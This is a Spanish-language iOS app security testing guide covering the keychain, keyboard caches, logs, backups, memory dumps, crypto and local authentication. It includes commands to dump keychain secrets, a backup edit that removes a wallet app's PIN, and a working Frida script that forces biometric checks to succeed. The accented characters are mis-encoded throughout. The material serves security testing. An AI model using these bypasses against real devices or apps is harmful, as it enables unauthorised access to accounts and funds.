Tambi√©n puedes usar `ios keychain dump` de [**Objection**](https://github.com/sensepost/objection)**.**

**NSURLCredential**

**NSURLCredential** es la clase perfecta para **almacenar nombre de usuario y contrase√±a en el llavero**. No es necesario preocuparse por NSUserDefaults ni ning√∫n envoltorio del llavero.\
Una vez que el usuario ha iniciado sesi√≥n, puedes almacenar su nombre de usuario y contrase√±a en el llavero:
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Puedes usar `ios nsurlcredentialstorage dump` de **Objection** para volcar estos secretos.

## Teclados Personalizados/Cach√© del Teclado

Desde iOS 8.0, Apple permite instalar extensiones personalizadas para iOS como teclados personalizados.\
Los teclados instalados se pueden gestionar a trav√©s de **Configuraci√≥n** > **General** > **Teclado** > **Teclados**\
Los teclados personalizados pueden usarse para **olfatear** las **pulsaciones de teclas** y enviarlas al servidor del atacante. Sin embargo, ten en cuenta que **se notificar√° al usuario sobre teclados personalizados que requieran conectividad de red.**\
Adem√°s, el **usuario puede cambiar a un teclado diferente** (m√°s confiable) para introducir las credenciales.

Adem√°s, **las aplicaciones pueden evitar que sus usuarios utilicen teclados personalizados** dentro de la aplicaci√≥n (o al menos para partes sensibles de la misma).

{% hint style="warning" %}
Se recomienda no permitir teclados de terceros si consideras que los usuarios no los necesitar√°n.
{% endhint %}

Ten en cuenta que debido a la autocorrecci√≥n y las sugerencias autom√°ticas, el teclado predeterminado de iOS capturar√° y almacenar√° cada palabra no est√°ndar en un archivo de cach√© si el atributo **secureTextEntry** no est√° configurado en **true** o si **autoCorrectionType** no est√° configurado en **UITextAutoCorrectionTypeNo**.

Por defecto, los teclados **almacenan esta cach√©** dentro del sandbox de las aplicaciones en el archivo `Library/Keyboard/{locale}-dynamic-text.dat` o en `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Sin embargo, podr√≠a estar guardando los datos en otro lugar.\
Es posible restablecer la cach√© en _**Configuraci√≥n**_ > _**General**_ > _**Restablecer**_ > _**Restablecer Diccionario del Teclado**_

{% hint style="info" %}
Por lo tanto, **revisa siempre estos archivos** y busca **informaci√≥n** **sensible** posible.\
**Interceptar el tr√°fico de red** es otra forma de verificar si el teclado personalizado est√° enviando pulsaciones de teclas a un servidor remoto.
{% endhint %}

El [protocolo UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) se utiliza para la cach√© del teclado. Las clases UITextField, UITextView y UISearchBar admiten autom√°ticamente este protocolo y ofrece las siguientes propiedades:

* `var autocorrectionType: UITextAutocorrectionType` determina si la autocorrecci√≥n est√° habilitada durante la escritura. Cuando la autocorrecci√≥n est√° habilitada, el objeto de texto rastrea palabras desconocidas y sugiere reemplazos adecuados, reemplazando el texto escrito autom√°ticamente a menos que el usuario anule el reemplazo. El valor predeterminado de esta propiedad es `UITextAutocorrectionTypeDefault`, que para la mayor√≠a de los m√©todos de entrada habilita la autocorrecci√≥n.
* `var secureTextEntry: BOOL` determina si se deshabilitan la copia de texto y la cach√© de texto y oculta el texto que se est√° ingresando para `UITextField`. El valor predeterminado de esta propiedad es `NO`.

**Para identificar este comportamiento en el c√≥digo:**

* Busca en el c√≥digo fuente implementaciones similares, como
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Abra archivos xib y storyboard en el `Interface Builder` de Xcode y verifique los estados de `Secure Text Entry` y `Correction` en el `Attributes Inspector` para el objeto apropiado.

La aplicaci√≥n debe prevenir el almacenamiento en cach√© de informaci√≥n sensible ingresada en campos de texto. Puede evitar el almacenamiento en cach√© deshabilit√°ndolo program√°ticamente, utilizando la directiva `textObject.autocorrectionType = UITextAutocorrectionTypeNo` en los UITextFields, UITextViews y UISearchBars deseados. Para datos que deben estar enmascarados, como PINs y contrase√±as, establezca `textObject.secureTextEntry` en `YES`.
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Registros**

La forma m√°s com√∫n de depurar c√≥digo es utilizando registros, y la aplicaci√≥n **puede imprimir informaci√≥n sensible dentro de los registros**.\
En la versi√≥n 6 de iOS y anteriores, los registros eran legibles por cualquier aplicaci√≥n (una aplicaci√≥n maliciosa podr√≠a leer los registros de otras aplicaciones y extraer informaci√≥n sensible de all√≠). **Hoy en d√≠a, las aplicaciones solo pueden acceder a sus propios registros**.

Sin embargo, un **atacante** con **acceso f√≠sico** a un dispositivo **desbloqueado** puede conectarlo a una computadora y **leer los registros** (nota que los registros escritos en disco por una aplicaci√≥n no se eliminan si la aplicaci√≥n se desinstala).

Se recomienda **navegar por todas las pantallas** de la aplicaci√≥n e **interactuar** con **cada** elemento de la interfaz de usuario y **funcionalidad** y proporcionar texto de entrada en todos los campos de texto y **revisar los registros** en busca de **informaci√≥n sensible** expuesta.

Utiliza las siguientes palabras clave para revisar el c√≥digo fuente de la aplicaci√≥n en busca de declaraciones de registro predefinidas y personalizadas:

* Para funciones predefinidas y integradas:
* NSLog
* NSAssert
* NSCAssert
* fprintf
* Para funciones personalizadas:
* Logging
* Logfile

**Monitoreo de Registros del Sistema**

Muchas aplicaciones registran mensajes informativos (y potencialmente sensibles) en el registro de la consola. El registro tambi√©n contiene informes de fallos y otra informaci√≥n √∫til.

Puedes utilizar estas herramientas:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Puede recopilar registros de consola a trav√©s de la ventana **Devices** de Xcode de la siguiente manera:

1. Inicie Xcode.
2. Conecte su dispositivo a su computadora anfitriona.
3. Elija **Window** -> **Devices and Simulators**.
4. Haga clic en su dispositivo iOS conectado en la secci√≥n izquierda de la ventana Devices.
5. Reproduzca el problema.
6. Haga clic en el bot√≥n **Open Console** ubicado en la parte superior derecha de la ventana Devices para ver los registros de consola en una ventana separada.

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (15).png>)

Tambi√©n puede conectarse al shell del dispositivo como se explica en Acceso al Shell del Dispositivo, instalar **socat** a trav√©s de **apt-get** y ejecutar el siguiente comando:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
```markdown
## Copias de seguridad

iOS incluye caracter√≠sticas de copia de seguridad autom√°tica que crean copias de los datos almacenados en el dispositivo. Puedes **hacer copias de seguridad de iOS** desde tu computadora anfitriona usando iTunes (hasta macOS Catalina) o Finder (desde macOS Catalina en adelante), o mediante la funci√≥n de copia de seguridad de iCloud. En ambos casos, la copia de seguridad incluye casi todos los datos almacenados en el dispositivo iOS, excepto datos altamente sensibles como la informaci√≥n de Apple Pay y la configuraci√≥n de Touch ID.

Dado que iOS respalda las aplicaciones instaladas y sus datos, una preocupaci√≥n obvia es si **datos sensibles del usuario** almacenados por la aplicaci√≥n podr√≠an **filtrarse involuntariamente a trav√©s de la copia de seguridad**. Otra preocupaci√≥n, aunque menos obvia, es si **configuraciones sensibles utilizadas para proteger datos o restringir la funcionalidad de la aplicaci√≥n podr√≠an ser alteradas para cambiar el comportamiento de la aplicaci√≥n despu√©s de restaurar una copia de seguridad modificada**. Ambas preocupaciones son v√°lidas y estas vulnerabilidades han demostrado existir en un gran n√∫mero de aplicaciones hoy en d√≠a.

Una copia de seguridad de un dispositivo en el que se ha instalado una aplicaci√≥n m√≥vil incluir√° todos los subdirectorios (excepto `Library/Caches/`) y archivos en el [directorio privado de la aplicaci√≥n](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW12).\
Por lo tanto, **evita almacenar datos sensibles en texto plano dentro de cualquiera de los archivos o carpetas que est√°n en el directorio privado de la aplicaci√≥n o subdirectorios**.

Aunque todos los archivos en `Documents/` y `Library/Application Support/` siempre son respaldados por defecto, puedes [excluir archivos de la copia de seguridad](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28) llamando a `NSURL setResourceValue:forKey:error:` con la clave `NSURLIsExcludedFromBackupKey`.\
Puedes usar las propiedades del sistema de archivos [NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple_ref/c/data/NSURLIsExcludedFromBackupKey) y [CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple_ref/c/data/kCFURLIsExcludedFromBackupKey) para excluir archivos y directorios de las copias de seguridad.

{% hint style="warning" %}
Por lo tanto, al revisar la copia de seguridad de una aplicaci√≥n, debes verificar si **alguna informaci√≥n sensible** es accesible y si puedes **modificar alg√∫n comportamiento sensible** de la aplicaci√≥n **modificando alguna configuraci√≥n de la copia de seguridad** y restaurando la copia de seguridad.
{% endhint %}

**C√≥mo probar**

Comienza por **crear una copia de seguridad del dispositivo** (puedes hacerlo usando Finder) y encontrar d√≥nde se almacena la copia de seguridad. La documentaci√≥n oficial de Apple te ayudar√° a [localizar copias de seguridad de tu iPhone, iPad y iPod touch](https://support.apple.com/en-us/HT204215).

Una vez que hayas encontrado la copia de seguridad del dispositivo (`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`), puedes comenzar a buscar informaci√≥n sensible usando grep, por ejemplo, o utilizando herramientas como [iMazing](https://imazing.com)).

Para identificar si una copia de seguridad est√° cifrada, puedes verificar la clave denominada "IsEncrypted" del archivo "Manifest.plist", ubicado en la ra√≠z del directorio de copia de seguridad. El siguiente ejemplo muestra una configuraci√≥n que indica que la copia de seguridad est√° cifrada:
```
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
En caso de que necesites trabajar con una copia de seguridad cifrada, hay algunos scripts de Python en el [repositorio de GitHub de DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), como **backup_tool.py** y **backup_passwd.py**, que servir√°n como un buen punto de partida. Sin embargo, ten en cuenta que podr√≠an no funcionar con las √∫ltimas versiones de iTunes/Finder y podr√≠an necesitar ajustes.

Tambi√©n puedes usar la herramienta [**iOSbackup**](https://pypi.org/project/iOSbackup/) para leer y extraer archivos f√°cilmente de una copia de seguridad de iOS cifrada con contrase√±a.

**C√≥mo modificar el comportamiento**

En la aplicaci√≥n de billetera de bitcoin de c√≥digo abierto, [Bither](https://github.com/bither/bither-ios), ver√°s que es posible configurar un PIN para bloquear la interfaz de usuario.\
Este PIN se almacena en el archivo `net.bither.plist` dentro de la **clave** **pin_code**.\
Si eliminas esta clave de ese plist en la copia de seguridad y restauras la copia, podr√°s acceder a la billetera.

## Probando la Memoria para Datos Sensibles

En alg√∫n momento, la informaci√≥n sensible se almacenar√° en la memoria. El objetivo es asegurarse de que esta informaci√≥n est√© expuesta lo menos posible.

Para investigar la memoria de una aplicaci√≥n, primero crea un **volcado de memoria**. Alternativamente, puedes **analizar la memoria en tiempo real** con, por ejemplo, un depurador. Independientemente del m√©todo que uses, este es un proceso muy propenso a errores porque los volcados proporcionan los datos dejados por las funciones ejecutadas y podr√≠as perderte de ejecutar pasos cr√≠ticos. Adem√°s, es bastante f√°cil pasar por alto datos durante el an√°lisis a menos que conozcas la huella de los datos que est√°s buscando (ya sea su valor exacto o su formato). Por ejemplo, si la aplicaci√≥n cifra seg√∫n una clave sim√©trica generada aleatoriamente, es muy poco probable que encuentres la clave en la memoria a menos que encuentres su valor por otros medios.

**Recuperando y Analizando un Volcado de Memoria**

Ya sea que est√©s usando un dispositivo con jailbreak o sin jailbreak, puedes volcar la memoria del proceso de la aplicaci√≥n con [objection](https://github.com/sensepost/objection) y [Fridump](https://github.com/Nightbringer21/fridump).

Despu√©s de que la memoria haya sido volcada (por ejemplo, a un archivo llamado "memory"), dependiendo de la naturaleza de los datos que est√°s buscando, necesitar√°s un conjunto de diferentes herramientas para procesar y analizar ese volcado de memoria. Por ejemplo, si te centras en cadenas de texto, podr√≠a ser suficiente para ti ejecutar el comando `strings` o `rabin2 -zz` para extraer esas cadenas.
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Abra `strings.txt` en su editor favorito y exam√≠nelo para identificar informaci√≥n sensible.

Sin embargo, si desea inspeccionar otro tipo de datos, preferir√≠a usar radare2 y sus capacidades de b√∫squeda. Consulte la ayuda de radare2 sobre el comando de b√∫squeda (`/?`) para obtener m√°s informaci√≥n y una lista de opciones. A continuaci√≥n, se muestra solo un subconjunto de ellas:
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**An√°lisis de Memoria en Tiempo de Ejecuci√≥n**

Al usar [**r2frida**](https://github.com/nowsecure/r2frida), puedes analizar e inspeccionar la memoria de la aplicaci√≥n mientras se ejecuta y sin necesidad de volcarla. Por ejemplo, puedes ejecutar los comandos de b√∫squeda anteriores desde r2frida y buscar en la memoria una cadena, valores hexadecimales, etc. Al hacerlo, recuerda anteponer el comando de b√∫squeda (y cualquier otro comando espec√≠fico de r2frida) con una barra invertida `\` despu√©s de iniciar la sesi√≥n con `r2 frida://usb//<nombre_de_tu_aplicaci√≥n>`.

## Criptograf√≠a Vulnerable

### Procesos de Gesti√≥n de Claves Deficientes

Algunos desarrolladores guardan datos sensibles en el almacenamiento local y los cifran con una clave codificada/predecible en el c√≥digo. Esto no se debe hacer ya que algunas t√©cnicas de ingenier√≠a inversa podr√≠an permitir a los atacantes extraer la informaci√≥n confidencial.

### Uso de Algoritmos Inseguros y/o Obsoletos

Los desarrolladores no deben usar **algoritmos obsoletos** para realizar **verificaciones** de autorizaci√≥n, **almacenar** o **enviar** datos. Algunos de estos algoritmos son: RC4, MD4, MD5, SHA1... Si se utilizan **hashes** para almacenar contrase√±as, por ejemplo, se deben usar hashes **resistentes** a la fuerza bruta con sal.

### Verificaci√≥n

Las principales verificaciones a realizar son encontrar si puedes encontrar contrase√±as/secreto **codificados** en el c√≥digo, o si estos son **predecibles**, y si el c√≥digo est√° utilizando alg√∫n tipo de algoritmos de **criptograf√≠a** **d√©bil**.

Es interesante saber que puedes **monitorear** algunas **bibliotecas** de **cripto** autom√°ticamente usando **objection** con:
```swift
ios monitor crypt
```
Para **m√°s informaci√≥n** sobre las APIs criptogr√°ficas de iOS y el acceso a bibliotecas, visita [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Autenticaci√≥n Local

El evaluador debe ser consciente de que **la autenticaci√≥n local siempre debe ser aplicada en un punto final remoto** o basada en un primitivo criptogr√°fico. Los atacantes pueden eludir f√°cilmente la autenticaci√≥n local si no se devuelve ning√∫n dato del proceso de autenticaci√≥n.

El [**framework de Autenticaci√≥n Local**](https://developer.apple.com/documentation/localauthentication) proporciona un conjunto de APIs para que los desarrolladores extiendan un di√°logo de autenticaci√≥n al usuario. En el contexto de la conexi√≥n a un servicio remoto, es posible (y recomendable) aprovechar el [keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) para implementar la autenticaci√≥n local.

El sensor de **identificaci√≥n por huella dactilar** es operado por el [coprocesador de seguridad SecureEnclave](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf) y no expone los datos de la huella dactilar a ninguna otra parte del sistema. Adem√°s de Touch ID, Apple introdujo _Face ID_: que permite la autenticaci√≥n basada en reconocimiento facial.

Los desarrolladores tienen dos opciones para incorporar la autenticaci√≥n Touch ID/Face ID:

* `LocalAuthentication.framework` es una API de alto nivel que se puede utilizar para **autenticar al usuario a trav√©s de Touch ID**. La aplicaci√≥n no puede acceder a ning√∫n dato asociado con la huella dactilar registrada y solo se le notifica si la autenticaci√≥n fue exitosa.
* `Security.framework` es una API de bajo nivel para acceder a [servicios de keychain](https://developer.apple.com/documentation/security/keychain\_services). Esta es una opci√≥n segura si tu aplicaci√≥n necesita **proteger algunos datos secretos con autenticaci√≥n biom√©trica**, ya que el control de acceso se gestiona a nivel de sistema y no se puede eludir f√°cilmente. `Security.framework` tiene una API en C, pero hay varios [envoltorios de c√≥digo abierto disponibles](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id), que facilitan el acceso al keychain tanto como a NSUserDefaults.

{% hint style="danger" %}
Ten en cuenta que el uso del `LocalAuthentication.framework` o del `Security.framework`, ser√° un control que puede ser eludido por un atacante, ya que solo devuelve un valor booleano y no datos para continuar con el proceso. Consulta [Don't touch me that way, de David Lindner y otros](https://www.youtube.com/watch?v=XhXIHVGCFFM) para obtener m√°s detalles.
{% endhint %}

### Framework de Autenticaci√≥n Local

Los desarrolladores pueden mostrar un **mensaje de autenticaci√≥n** utilizando la funci√≥n **`evaluatePolicy`** de la clase **`LAContext`**. Dos pol√≠ticas disponibles definen formas aceptables de autenticaci√≥n:

* `deviceOwnerAuthentication`(Swift) o `LAPolicyDeviceOwnerAuthentication`(Objective-C): Cuando est√° disponible, se solicita al usuario que realice la autenticaci√≥n Touch ID. Si Touch ID no est√° activado, se solicita en su lugar el c√≥digo de acceso del dispositivo. Si el c√≥digo de acceso del dispositivo no est√° habilitado, la evaluaci√≥n de la pol√≠tica falla.
* `deviceOwnerAuthenticationWithBiometrics` (Swift) o `LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C): La autenticaci√≥n se restringe a la biometr√≠a donde se solicita al usuario Touch ID.

La funci√≥n **`evaluatePolicy` devuelve un valor booleano** que indica si el usuario se ha autenticado con √©xito. Lo que significa que puede ser f√°cilmente eludido (ver m√°s abajo)

### Autenticaci√≥n Local usando Keychain

Las **APIs de keychain de iOS pueden (y deben) usarse para implementar la autenticaci√≥n local**. Durante este proceso, la aplicaci√≥n almacena un token de autenticaci√≥n secreto u otro dato secreto que identifica al usuario en el keychain. Para autenticarse en un servicio remoto, el usuario debe desbloquear el keychain usando su frase de paso o huella dactilar para obtener los datos secretos.

El keychain permite guardar elementos con el atributo especial `SecAccessControl`, que permitir√° el acceso al elemento del keychain solo despu√©s de que el usuario haya pasado la autenticaci√≥n Touch ID (o c√≥digo de acceso, si se permite tal alternativa por los par√°metros del atributo).

En el siguiente ejemplo guardaremos la cadena "test\_strong\_password" en el keychain. La cadena solo se puede acceder en el dispositivo actual mientras el c√≥digo de acceso est√© configurado (`kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` par√°metro) y despu√©s de la autenticaci√≥n Touch ID para los dedos actualmente registrados solamente (`SecAccessControlCreateFlags.biometryCurrentSet` par√°metro):

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
```markdown
{% endtab %}
{% endtabs %}

Ahora podemos solicitar el elemento guardado en el llavero. Los servicios de llavero presentar√°n el di√°logo de autenticaci√≥n al usuario y devolver√°n datos o nil dependiendo de si se proporcion√≥ una huella digital adecuada o no.

{% tabs %}
{% tab title="Swift" %}
```
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Detecci√≥n

El uso de frameworks en una aplicaci√≥n tambi√©n puede detectarse analizando la lista de bibliotecas din√°micas compartidas del binario de la app. Esto se puede hacer utilizando `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Si `LocalAuthentication.framework` se utiliza en una app, la salida contendr√° ambas de las siguientes l√≠neas (recuerda que `LocalAuthentication.framework` utiliza `Security.framework` internamente):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Si se utiliza `Security.framework`, solo se mostrar√° el segundo.

### Bypass del Marco de Autenticaci√≥n Local

#### Objection

[**Objection Biometrics Bypass**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) puede utilizarse para eludir LocalAuthentication. Objection **utiliza Frida para instrumentar la funci√≥n `evaluatePolicy` de modo que devuelva `True`** incluso si la autenticaci√≥n no se realiz√≥ con √©xito. Utiliza el comando `ios ui biometrics_bypass` para eludir la autenticaci√≥n biom√©trica insegura. Objection registrar√° un trabajo, que reemplazar√° el resultado de `evaluatePolicy`. Funcionar√° tanto en implementaciones de Swift como de Objective-C.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Si es vulnerable, el m√≥dulo omitir√° autom√°ticamente el formulario de inicio de sesi√≥n.

#### Frida

Un ejemplo de uso de **`evaluatePolicy`** de la [aplicaci√≥n DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Para eludir la Autenticaci√≥n Local, tenemos que escribir un script de Frida que **bypasses** la verificaci√≥n _**evaluatePolicy**_ mencionada anteriormente. Como puedes ver en el fragmento de c√≥digo pegado arriba, **evaluatePolicy** utiliza un **callback** que determina el **result**. Por lo tanto, la manera m√°s f√°cil de lograr el hack es interceptar ese callback y asegurarse de que siempre devuelva el_ **success=1**.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposici√≥n de Funcionalidades Sensibles a trav√©s de IPC

### Manejadores de URI Personalizados / Deeplinks / Esquemas Personalizados

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Enlaces Universales

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Compartir UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extensiones de Aplicaciones

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializaci√≥n y Codificaci√≥n

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Comunicaci√≥n de Red

Es importante verificar que no se produzca comunicaci√≥n **sin encriptaci√≥n** y tambi√©n que la aplicaci√≥n est√© **validando correctamente el certificado TLS** del servidor.\
Para revisar estos problemas puedes usar un proxy como **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Verificaci√≥n de Nombre de Host

Un problema com√∫n al validar el certificado TLS es verificar que el certificado fue firmado por una **CA de confianza**, pero **no verificar** si **el nombre de host** del certificado es el nombre de host al que se accede.\
Para revisar este problema usando Burp, despu√©s de confiar en la CA de Burp en el iPhone, puedes **crear un nuevo certificado con Burp para un nombre de host diferente** y usarlo. Si la aplicaci√≥n sigue funcionando, entonces, algo es vulnerable.

### Anclaje de Certificados

Si una aplicaci√≥n est√° utilizando correctamente el Anclaje de Certificados, entonces la aplicaci√≥n solo funcionar√° si el certificado es el esperado. Al probar una aplicaci√≥n **esto podr√≠a ser un problema ya que Burp servir√° su propio certificado.**\
